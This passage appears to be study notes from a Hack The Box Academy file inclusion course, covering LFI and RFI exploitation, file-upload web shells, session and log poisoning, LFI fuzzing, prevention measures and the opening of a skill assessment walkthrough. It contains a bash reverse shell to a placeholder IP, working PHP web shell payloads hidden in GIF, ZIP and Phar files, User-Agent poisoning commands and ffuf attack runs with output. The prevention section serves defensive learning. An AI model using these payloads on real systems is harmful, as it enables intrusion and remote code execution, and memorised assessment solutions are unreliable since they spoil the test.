    - **Open reverse shell**: Use `bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1` to get a shell.

---

### **Notes:**

- Always verify if **`allow_url_include`** is enabled by dumping the PHP configuration:

```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' | base64 -d | grep allow_url_include
```

- If **`allow_url_include = On`**, RFI attacks are possible.

---

### **Mitigation (Defensive Measures):**

- **Disable `allow_url_include`** in `php.ini`.
- Use **WAF (Web Application Firewalls)** to block remote URLs.
- Perform **input validation** to sanitize the `language` parameter.
- Restrict outgoing connections from the server.

---

# LFI and File Uploads – Exploiting File Inclusion Vulnerabilities

## 1. Overview

**Local File Inclusion (LFI)** vulnerabilities allow attackers to include files from the web server’s filesystem. Combining **LFI with file uploads** can lead to **remote code execution (RCE)** by including malicious payloads uploaded to the server.

**Core Concept:**

- Upload a **malicious file** (disguised as an image or ZIP) containing PHP code.
- Use LFI to **include and execute** the uploaded file, granting shell access.

---

## 2. LFI Execution Flow

| **Stage** | **Description** |
| --- | --- |
| **1. Identify LFI** | Test for LFI by modifying file paths. |
| **2. Upload Malicious File** | Upload a PHP shell disguised as an image/zip. |
| **3. Execute via LFI** | Trigger the uploaded file through LFI. |
| **4. Command Execution** | Achieve RCE by passing system commands (e.g., `id`). |

---

## 3. PHP Functions Allowing Code Execution

Certain PHP functions, if vulnerable to LFI, **allow execution** of included files.

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| --- | --- | --- | --- |
| **PHP** |  |  |  |
| `include()`/`include_once()` | ✅ | ✅ | ✅ |
| `require()`/`require_once()` | ✅ | ✅ | ❌ |
| **NodeJS** |  |  |  |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |  |  |  |
| `import` | ✅ | ✅ | ✅ |
| **.NET** |  |  |  |
| `include` | ✅ | ✅ | ✅ |

---

## 4. Exploiting LFI Through File Uploads

---

### 4.1. Crafting a Malicious Image

**Objective:** Upload a disguised PHP web shell (e.g., `shell.gif`).

- Create a **GIF image** with PHP shell code:
    
    ```bash
    echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
    ```
    
- **Why GIF?**
    - GIF uses **ASCII magic bytes** (`GIF8`), making it easy to craft manually.
    - PHP code is appended after the magic bytes.
    - The file **bypasses basic content-type checks**.

---

### 4.2. Uploading the File

- Navigate to a **Profile or Avatar upload page**:
    
    ```
    http://<SERVER_IP>:<PORT>/settings.php
    ```
    
- Upload the malicious file (shell.gif).
- After uploading, **inspect the source code** to locate the file path:
    
    ```html
    <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
    ```
    
- File Path: `/profile_images/shell.gif`

---

### 4.3. Triggering the Payload via LFI

- Use the LFI vulnerability to include the uploaded file:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
    ```
    
- **Command Injection (RCE):**
    
    ```bash
    curl "http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id"
    ```
    
- **Result:** Remote code executed as `www-data`.

---

## 5. Alternative Methods (ZIP and Phar Wrappers)

### 5.1. Zip Uploads for RCE

### Step 1: Create ZIP Archive Containing PHP Shell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
```

- A **PHP shell is zipped** into a file (`shell.jpg`).
- The file may bypass basic upload restrictions.

### Step 2: Upload ZIP Archive

- Upload the **zip file disguised as an image**.

### Step 3: Execute via Zip Wrapper

- **Zip Wrapper Syntax:**
    
    ```
    zip://path/to/archive.zip#file.php
    ```
    
- Use LFI to include and extract PHP code:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
    ```
    
- **URL Encoded `#` for Zip Extraction:** `%23`

---

### 5.2. Phar File Uploads (Deserialization Exploit)

### Step 1: Create Phar Payload

- Craft a Phar archive containing PHP code:
    
    ```php
    <?php
    $phar = new Phar('shell.phar');
    $phar->startBuffering();
    $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
    $phar->setStub('<?php __HALT_COMPILER(); ?>');
    
    $phar->stopBuffering();
    ```
    
- This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

---

### Step 2: Upload the Phar File

- Upload the generated **phar archive disguised as a JPG** (`shell.jpg`).

### Step 3: Trigger the Phar Payload via LFI

- **Phar Wrapper Syntax:**
    
    ```
    phar://path/to/archive.phar/file
    ```
    
- Use LFI to execute code:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
    ```
    
    ![image.png](image%20133.png)
    

## 6. Common Upload Paths to Test

| **Target Path** | **Description** |
| --- | --- |
| `/uploads/` | Common upload directory. |
| `/profile_images/` | Avatar/profile uploads. |
| `/public/files/` | Public upload path. |
| `/tmp/uploads/` | Temporary upload storage. |

## 7. Key Points

- **Bypass Restrictions:**
    - **PHP code in images (GIF, JPEG)** bypasses content-type filters.
    - **Zip and Phar wrappers** work if direct PHP uploads are blocked.
- **Directory Traversal:**
    - If the vulnerable LFI **prefixes a directory**, use:
        
        ```
        ../../../../../profile_images/shell.gif
        ```
        
- **Stealth Techniques:**
    - Use non-executable extensions (e.g., `.jpg`) to avoid detection.

# Log Poisoning

| **Function** | **Read Content** | **Execute** | **Remote URL** |
| --- | --- | --- | --- |
| **PHP** |  |  |  |
| `include()/include_once()` | ✅ | ✅ | ✅ |
| `require()/require_once()` | ✅ | ✅ | ❌ |
| **NodeJS** |  |  |  |
| `res.render()` | ✅ | ✅ | ❌ |
| **Java** |  |  |  |
| `import` | ✅ | ✅ | ✅ |
| **.NET** |  |  |  |
| `include` | ✅ | ✅ | ✅ |

### **Log Poisoning Overview:**

Log poisoning is an attack technique where malicious PHP code is injected into log files. This PHP code can later be executed by exploiting Local File Inclusion (LFI) vulnerabilities, allowing attackers to gain remote code execution (RCE). The attack works by including the poisoned log files using LFI functions (`include`, `require`, etc.). If the vulnerable function has execution privileges, the embedded PHP code within the log gets executed.

---

### **PHP Session Poisoning:**

PHP session files store user-specific data and are often exploitable if they are accessible via LFI.

**Session File Locations:**

- **Linux**: `/var/lib/php/sessions/`
- **Windows**: `C:\Windows\Temp\`

**Attack Steps:**

1. **Identify the PHPSESSID**:
    
    Obtain the `PHPSESSID` from cookies. Example:
    
    ```
    PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd
    ```
    
    This corresponds to a session file:
    
    ```
    /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
    ```
    
2. **View Session Contents via LFI**:
    
    Use LFI to include the session file:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
    ```
    
    <aside>
    💡
    
    **Note:** As you may easily guess, the cookie value will differ from one session to another, so you need to use the cookie value you find in your own session to perform the same attack.
    
    </aside>
    
    - We get:
    
    ```bash
     selected_language|s:6:"en.php";preference|s:7:"English";
     # So we have 2 values
     # 1: selected_language
     # 2: preference
    ```
    
    The `preference` value is not under our control, as we did not specify it anywhere and must be automatically specified. However, the `page` value is under our control, as we can control it through the `?language=` parameter.
    
    To test this we can try and change the value of page to a custom value:
    
    ```bash
    http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
    ```
    
    Now, let's include the session file once again to look at the contents:
    
    ```bash
    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
    ```
    
    ![image.png](image%20134.png)
    
3. **Inject PHP Code into the Session**:
    
    By modifying the vulnerable `language` parameter, inject PHP code:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28$_GET%5B'cmd'%5D%29%3B%3F%3E
    ```
    
4. **Execute Commands**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
    #
    http://83.136.248.146:58611/index.php?language=/var/lib/php/sessions/sess_qrfgsaavsou5asbfs0qo885r5m&cmd=id
    ```
    
    ![image.png](image%20135.png)
    
    <aside>
    💡
    
    Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.
    
    </aside>
    

### **Server Log Poisoning:**

Web servers like Apache and Nginx store logs that can be exploited if they are readable through LFI.

**Log Locations:**

- **Apache (Linux)**: `/var/log/apache2/access.log`
- **Nginx (Linux)**: `/var/log/nginx/access.log`
- **Apache (Windows)**: `C:\xampp\apache\logs\access.log`
- **Nginx (Windows)**: `C:\nginx\log\access.log`

**Attack Steps:**

1. **Check Log Access via LFI**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
    ```
    
2. **Poison the Logs**:
    
    Use Burp Suite or curl to modify the `User-Agent` and inject PHP code:
    
    ```bash
    curl -s "http://83.136.248.146:58611/" -A "<?php system(\$_GET['cmd']); ?>"
    ```
    
3. **Execute Commands**:
    
    ```
    http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
    ```
    
    <aside>
    💡
    
    **Tip:** Logs tend to be huge, and loading them in an LFI vulnerability may take a while to load, or even crash the server in worst-case scenarios. So, be careful and efficient with them in a production environment, and don't send unnecessary requests.
    
    </aside>
    
- With Burp:
    
    ![image.png](image%20136.png)
    
    ![image.png](image%20137.png)
    

### **Server Log Poisoning via `/proc/self/environ`:**

1. **Goal:** Inject PHP code through the `User-Agent` header, leveraging LFI (Local File Inclusion) to execute it via process files like `/proc/self/environ or  /proc/self/fd/N` (where N is a PID usually between 0-50)
2. **Why `/proc/self/environ`:**
    - Contains **environment variables** of the current process, including `User-Agent`.
    - Acts as an alternative to access logs when log files are not writable or accessible.
3. **Exploit Flow:**
    - Inject PHP with:
        
        ```bash
        curl -s "http://target/index.php" -A "<?php system(\$_GET['cmd']); ?>"
        ```
        
    - Execute by including:
        
        ```bash
        curl -s "http://target/index.php?file=/proc/self/environ&cmd=id"
        ```
        
4. **File Descriptors (Alternate Method):**
    - Use `/proc/self/fd/N` (e.g., `fd/1` or `fd/2`) to access open files linked to the process.
    - Example:
        
        ```bash
        curl -s "http://target/index.php?file=/proc/self/fd/1"
        ```
        
5. **Advantages:**
    - **Bypasses log restrictions** – No need to write to `/var/log/`.
    - Works if `/proc/self/environ` is **readable by `www-data`** or similar low-privileged users.
6. **Limitations:**
    - **Permissions** may block reading `/proc/self/environ`.
    - PHP must **execute included files as code** for this to work.
    - Hardened systems may sanitize or isolate `/proc/self/` for non-root users.

### **Additional Targets for Log Poisoning:**

- **SSH Logs**: `/var/log/sshd.log`
- **FTP Logs**: `/var/log/vsftpd.log`
- **Mail Logs**: `/var/log/mail`

By poisoning logs that capture login attempts, attackers can inject PHP code and execute it through LFI. This technique works with any log that records user-controlled input.

---

# Automated Scanning for LFI (Local File Inclusion) Vulnerabilities

Automated scanning is a critical technique for quickly identifying Local File Inclusion (LFI) vulnerabilities. While manual exploitation offers the advantage of crafting custom payloads for specific configurations, automated tools can rapidly identify trivial vulnerabilities, saving time during penetration tests. This section explores fuzzing tools, LFI-specific wordlists, and automated tools designed to detect LFI vulnerabilities.

---

## Fuzzing Parameters

Web applications often expose parameters that aren't directly linked to user-facing forms. These parameters may not undergo the same security scrutiny, making them potential targets for LFI attacks.

### Fuzzing for Parameters (Example):

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.250.212:53998/index.php?FUZZ=key'
```

**Explanation:**

- **ffuf**: Fuzzes the `index.php` page for parameters.
- **burp-parameter-names.txt**: A wordlist of common GET/POST parameters.
- **fs 2287**: Filters responses by size to detect differences.
- For a more precise scan, we can limit our scan to the most popular LFI parameters:

```bash
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```

---

## LFI Wordlists

Testing LFI payloads manually is essential, but automated wordlists can help identify common vulnerabilities. A popular wordlist is [`LFI-Jhaddix.txt`](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), which contains various bypass techniques and file paths.

### Fuzzing for LFI with Wordlists:

```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 2461, Words: 636, Lines: 72]
...SNIP...
../../../../etc/passwd  [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 3661, Words: 645, Lines: 91]
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 3661, Words: 645, Lines: 91]
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 3661, Words: 645, Lines: 91]
```

---

## Fuzzing Server Files

Identifying critical files (like configurations, logs, and server paths) through LFI can reveal sensitive information that aids in exploitation.

### Fuzzing for Webroot Paths:

We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its `/uploads` directory through relative paths (e.g. `../../uploads`). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths. Depending on our LFI situation, we may need to add a few back directories (e.g. `../../../../`), and then add our `index.php` afterwards.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

# example:
/var/www/html/ [Status: 200]
```

---

## Fuzzing Server Configurations and Logs

Web server configurations and logs often contain paths that can further the exploitation process.

Precise scan we can use Wordlist for Linux and Wordlist for Windows in **`/usr/share/wordlists/seclists/Fuzzing/LFI`**

![image.png](image%20138.png)

### Example (Apache Configurations):

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

#
/etc/apache2/apache2.conf [Status: 200]
/etc/apache2/envvars [Status: 200]
```

By including `/etc/apache2/envvars`, variables like `APACHE_LOG_DIR` can be resolved, revealing the log directory.

---

## LFI Tools

Automated tools simplify LFI detection and exploitation. Popular tools include:

- [**LFISuite**](https://github.com/D35m0nd142/LFISuite)
- [**LFiFreak**](https://github.com/OsandaMalith/LFiFreak)
- [**liffy](https://github.com/mzfr/liffy) -** https://github.com/mzfr/liffy/wiki/Usage (this is the newest one out of all of them)

Most tools automate parameter fuzzing, log poisoning, and common LFI bypass techniques.

### Example (Running LFISuite):

```bash
python LFISuite.py --url 'http://<SERVER_IP>:<PORT>/index.php?language='
###
python3 liffy.py -h
```

---

## Key Takeaways:

- Automated tools are effective but may miss vulnerabilities that manual testing can identify.
- Combining manual testing with automated fuzzing yields the best results.
- Continuous testing with updated tools and wordlists ensures comprehensive coverage of LFI vulnerabilities.

# **File Inclusion Prevention Techniques**

**1. Avoid User-Controlled Inputs in File Inclusion Functions**

- Do not pass user-supplied input directly into file inclusion functions like `include()`, `require()`, `res.render()`, etc.
- Dynamically load files on the back-end without user interaction.
- **Example (PHP)**:
    
    ```php
    // Insecure
    include($_GET['page']);
    
    // Secure (Whitelist Approach)
    $whitelist = ['about' => 'about.php', 'home' => 'home.php'];
    $page = $_GET['page'] ?? 'home';
    include($whitelist[$page] ?? 'home.php');
    ```
    

---

**2. Whitelisting Files**

- Use a whitelist of allowed files to include based on user input.
- Implement strict mappings of file names to IDs or predefined paths.
- Default to a safe page if the input doesn't match the whitelist.

---

### **Directory Traversal Prevention**

- Prevent path traversal (`../`) by sanitizing and validating input.

Directory traversal could potentially allow attackers to do any of the following:

- Read `/etc/passwd` and potentially find SSH Keys or know valid user names for a password spray attack
- Find other services on the box such as Tomcat and read the `tomcat-users.xml` file
- Discover valid PHP Session Cookies and perform session hijacking
- Read current web application configuration and source code

**Method 1: Use Language-Specific Functions**

- Use native functions like `basename()` in PHP to ensure only filenames are extracted, not paths.
    
    ```php
    $file = basename($_GET['page']);
    include("/path/to/pages/" . $file);
    ```
    

**Method 2: Recursively Strip Path Traversal**

```php
while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
}
```

As we can see, this code recursively removes `../` sub-strings, so even if the resulting string contains `../` it would still remove it, which would prevent some of the bypasses we attempted in this module.

---

### **Web Server Configuration**

- Lock the web application to its root directory to prevent access to sensitive files.

**PHP Configuration:**

- Disable remote file inclusion:
    
    ```
    allow_url_fopen = Off
    allow_url_include = Off
    ```
    
- Restrict file access to specific directories:
    
    ```
    open_basedir = /var/www/html
    ```
    
- Disable dangerous modules:
    
    ```php
    # first we try to find php.ini
    php --ini
    # we search for
    disable_functions = system, exec, shell_exec, passthru
    # we restart apache2 (if it's apache on the system) for changes to take effect
    sudo systemctl restart apache2
    ```
    

---

### **Web Application Firewalls (WAF)**

- Deploy a WAF like **ModSecurity** to filter malicious requests.
- Configure the WAF in **permissive mode** to monitor/block suspicious requests without disrupting legitimate traffic.
- Continuously tune WAF rules to avoid false positives.

---

### **Docker/Containerization**

- Run the application in Docker containers to sandbox and isolate the environment.
- Limit the container's access to sensitive files by configuring the filesystem.

---

### **Testing and Continuous Monitoring**

- Conduct regular security audits, penetration tests, and vulnerability scans.
- Monitor logs for signs of exploitation attempts.
- Apply patches and updates promptly, especially after zero-day vulnerabilities are disclosed.

---

# SKILL ASSESSMENT

### **"Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer."**

After spawning the target machine, students need to navigate to its website's root page and notice that when hovering over a hyperlink, the content is fetched via the `page` URL parameter:

![](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_21.png)

Therefore, students need to use PHP filters to read the source code of the `index` page, such as with the `convert.base64-encode` filter:

Skills Assessment - File Inclusion

```
view-source:http://STMIP:STMPO/index.php?page=php://filter/convert.base64-encode/resource=index
```

![](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_22.png)

Students need to decode the base64-encoded `index` page:

Code: shell

```
echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDx0aXRsZT5JbmxhbmVGcmVpZ2h0PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9UG9wcGluczoyMDAsMzAwLDQwMCw3MDAsOTAwfERpc3BsYXkrUGxheWZhaXI6MjAwLDMwMCw0MDAsNzAwIj4gCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImZvbnRzL2ljb21vb24vc3R5bGUuY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9tYWduaWZpYy1wb3B1cC5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvanF1ZXJ5LXVpLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wuY2Fyb3VzZWwubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wudGhlbWUuZGVmYXVsdC5taW4uY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5jc3MiPgoKICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iZm9udHMvZmxhdGljb24vZm9udC9mbGF0aWNvbi5jc3MiPgoKCgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYW9zLmNzcyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICAKICA8ZGl2IGNsYXNzPSJzaXRlLXdyYXAiPgoKICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLW1lbnUiPgogICAgICA8ZGl2IGNsYXNzPSJzaXRlLW1vYmlsZS1tZW51LWhlYWRlciI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1jbG9zZSBtdC0zIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uLWNsb3NlMiBqcy1tZW51LXRvZ2dsZSI+PC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1ib2R5Ij48L2Rpdj4KICAgIDwvZGl2PgogICAgCiAgICA8aGVhZGVyIGNsYXNzPSJzaXRlLW5hdmJhciBweS0zIiByb2xlPSJiYW5uZXIiPgoKICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgIAogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTExIGNvbC14bC0yIj4KICAgICAgICAgICAgPGgxIGNsYXNzPSJtYi0wIj48YSBocmVmPSJpbmRleC5waHAiIGNsYXNzPSJ0ZXh0LXdoaXRlIGgyIG1iLTAiPklubGFuZUZyZWlnaHQ8L2E+PC9oMT4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC0xMCBkLW5vbmUgZC14bC1ibG9jayI+CiAgICAgICAgICAgIDxuYXYgY2xhc3M9InNpdGUtbmF2aWdhdGlvbiBwb3NpdGlvbi1yZWxhdGl2ZSB0ZXh0LXJpZ2h0IiByb2xlPSJuYXZpZ2F0aW9uIj4KCiAgICAgICAgICAgICAgPHVsIGNsYXNzPSJzaXRlLW1lbnUganMtY2xvbmUtbmF2IG14LWF1dG8gZC1ub25lIGQtbGctYmxvY2siPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhY3RpdmUiPjxhIGhyZWY9ImluZGV4LnBocCI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWluZHVzdHJpZXMiPkluZHVzdHJpZXM8L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0PC9hPjwvbGk+CgkJPD9waHAgCgkJICAvLyBlY2hvICc8bGk+PGEgaHJlZj0iaWxmX2FkbWluL2luZGV4LnBocCI+QWRtaW48L2E+PC9saT4nOyAKCQk/PgogICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvbmF2PgogICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgIDxkaXYgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGQteGwtbm9uZSBtbC1tZC0wIG1yLWF1dG8gcHktMyIgc3R5bGU9InBvc2l0aW9uOiByZWxhdGl2ZTsgdG9wOiAzcHg7Ij48YSBocmVmPSIjIiBjbGFzcz0ic2l0ZS1tZW51LXRvZ2dsZSBqcy1tZW51LXRvZ2dsZSB0ZXh0LXdoaXRlIj48c3BhbiBjbGFzcz0iaWNvbi1tZW51IGgzIj48L3NwYW4+PC9hPjwvZGl2PgoKICAgICAgICAgIDwvZGl2PgoKICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIAogICAgPC9oZWFkZXI+CgogIAoKICAgIDxkaXYgY2xhc3M9InNpdGUtYmxvY2tzLWNvdmVyIG92ZXJsYXkiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoaW1hZ2VzL2hlcm9fYmdfMS5qcGcpOyIgZGF0YS1hb3M9ImZhZGUiIGRhdGEtc3RlbGxhci1iYWNrZ3JvdW5kLXJhdGlvPSIwLjUiPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyBhbGlnbi1pdGVtcy1jZW50ZXIganVzdGlmeS1jb250ZW50LWNlbnRlciB0ZXh0LWNlbnRlciI+CgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTgiIGRhdGEtYW9zPSJmYWRlLXVwIiBkYXRhLWFvcy1kZWxheT0iNDAwIj4KICAgICAgICAgICAgCgogICAgICAgICAgICA8aDEgY2xhc3M9InRleHQtd2hpdGUgZm9udC13ZWlnaHQtbGlnaHQgbWItNSB0ZXh0LXVwcGVyY2FzZSBmb250LXdlaWdodC1ib2xkIj5Xb3JsZHdpZGUgRnJlaWdodCBTZXJ2aWNlczwvaDE+CiAgICAgICAgICAgIDxwPjxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgcHktMyBweC01IHRleHQtd2hpdGUiPkdldCBTdGFydGVkITwvYT48L3A+CgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+ICAKCjw/cGhwCmlmKCFpc3NldCgkX0dFVFsncGFnZSddKSkgewogIGluY2x1ZGUgIm1haW4ucGhwIjsKfQplbHNlIHsKICAkcGFnZSA9ICRfR0VUWydwYWdlJ107CiAgaWYgKHN0cnBvcygkcGFnZSwgIi4uIikgIT09IGZhbHNlKSB7CiAgICBpbmNsdWRlICJlcnJvci5waHAiOwogIH0KICBlbHNlIHsKICAgIGluY2x1ZGUgJHBhZ2UgLiAiLnBocCI7CiAgfQp9Cj8+CiAgICA8Zm9vdGVyIGNsYXNzPSJzaXRlLWZvb3RlciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93IHB0LTUgbXQtNSB0ZXh0LWNlbnRlciI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJib3JkZXItdG9wIHB0LTUiPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgQ29weXJpZ2h0ICZjb3B5OzxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUobmV3IERhdGUoKS5nZXRGdWxsWWVhcigpKTs8L3NjcmlwdD4gQWxsIHJpZ2h0cyByZXNlcnZlZCB8IFRoaXMgdGVtcGxhdGUgaXMgbWFkZSB3aXRoIDxpIGNsYXNzPSJpY29uLWhlYXJ0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiBieSA8YSBocmVmPSJodHRwczovL2NvbG9ybGliLmNvbSIgdGFyZ2V0PSJfYmxhbmsiID5Db2xvcmxpYjwvYT4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgPC9mb290ZXI+CiAgPC9kaXY+CgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnktMy4zLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LW1pZ3JhdGUtMy4wLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2N